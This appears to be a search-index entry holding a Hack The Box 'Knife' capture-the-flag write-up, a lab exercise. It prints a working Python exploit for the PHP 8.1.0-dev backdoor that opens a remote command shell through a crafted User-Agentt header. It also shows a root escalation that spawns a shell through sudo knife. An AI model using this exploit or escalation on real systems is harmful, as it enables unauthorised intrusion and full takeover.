[ { "title": "HTB - Knife (EN)", "url": "/posts/Knife-WriteUp/", "categories": "Cybersecurity, HTB, WriteUps", "tags": "HTB, Knife, PHP, GTFOBin, Backdoor", "date": "2021-09-08 14:00:00 +0200", "snippet": "We&#39;ll start scanning ports with NMAP.$ nmap -v 10.10.10.242Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-08 18:20 CESTInitiating Ping Scan at 20:20Scanning 10.10.10.242 [2 ports]Completed Ping Scan at 20:20, 0.07s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 20:20Completed Parallel DNS resolution of 1 host. at 20:20, 0.03s elapsedInitiating Connect Scan at 20:20Scanning 10.10.10.242 [1000 ports]Discovered open port 22/tcp on 10.10.10.242Discovered open port 80/tcp on 10.10.10.242Completed Connect Scan at 20:20, 9.31s elapsed (1000 total ports)Nmap scan report for 10.10.10.242Host is up (0.067s latency).Not shown: 998 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open httpRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 9.74 secondsLooks like we have a web server and SSH service. Let&#39;s try to see what is on the web.It is a hospital, but I haven&#39;t found anything useful on the web.With Wappalyzer we can discover what technologies are used to create a website.Alright, let&#39;s search for vulnerabilities for these technologies.There&#39;s a vulnerability for PHP 8.1.0dev.https://www.exploit-db.com/exploits/49933I copied the script and executed#!/usr/bin/env python3import osimport reimport requestshost = input(&quot;Enter the full host url:\\n&quot;)request = requests.Session()response = request.get(host)if str(response) == &#39;&amp;lt;Response [200]&amp;gt;&#39;: print(&quot;\\nInteractive shell is opened on&quot;, host, &quot;\\nCan&#39;t acces tty; job crontol turned off.&quot;) try: while 1: cmd = input(&quot;$ &quot;) headers = { &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;, &quot;User-Agentt&quot;: &quot;zerodiumsystem(&#39;&quot; + cmd + &quot;&#39;);&quot; } response = request.get(host, headers = headers, allow_redirects = False) current_page = response.text stdout = current_page.split(&#39;&amp;lt;!DOCTYPE html&amp;gt;&#39;,1) text = print(stdout[0]) except KeyboardInterrupt: print(&quot;Exiting...&quot;) exitelse: print(&quot;\\r&quot;) print(response) print(&quot;Host is not available, aborting...&quot;) exit$ python3 exploit.pyEnter the full host url:http://10.10.10.242/Interactive shell is opened on http://10.10.10.242/Can&#39;t acess tty; job crontol turned off.$ whoamijamesWe are in!, let&#39;s check the user flag.$ cat home/james/user.txtcb5ddfa28b84d6b930bca47d9bc984b6Now we have to get access with root.Check if we can execute commands as root with james$ sudo -lMatching Defaults entries for james on knife: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser james may run the following commands on knife: (root) NOPASSWD: /usr/bin/knifeWe can execute command as root with knife command$ sudo /usr/bin/knife exec -E &quot;exec &#39;/bin/sh -i&#39;&quot;Check the root flag!$ cat /root/root.txt695774b32219bb1f3f9402267b6d9607And we finish!" } ]
